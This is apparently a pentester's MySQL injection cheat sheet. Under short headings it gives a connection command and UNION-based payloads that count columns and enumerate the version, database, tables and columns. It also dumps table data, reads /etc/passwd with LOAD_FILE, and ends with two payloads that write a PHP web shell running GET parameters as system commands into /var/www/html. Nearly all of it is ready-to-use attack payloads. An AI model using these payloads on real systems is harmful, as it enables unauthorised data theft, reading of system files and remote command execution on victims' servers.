
### mysql connect
```bash
mysql -h<host> -u"<username>" -p"<password>" [-e"<QUERY>"] <DATABASE>
```

### Get Number of Columns

```bash
SELECT 1,2,3 order by 3;#
```

### Get Version

```bash
# @@version 사용 가능
select 1,2,version();#
```

### Get Database Name

```bash
select 1,2,database();#
```

### Get Table Name

```bash
select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
```

### Get Column Name

```bash
select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
```

### Read a File

```bash
SELECT LOAD_FILE('/etc/passwd')
```

### Dump Data

```bash
union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
```

### Create Webshell

```bash
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
```

```bash
SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
```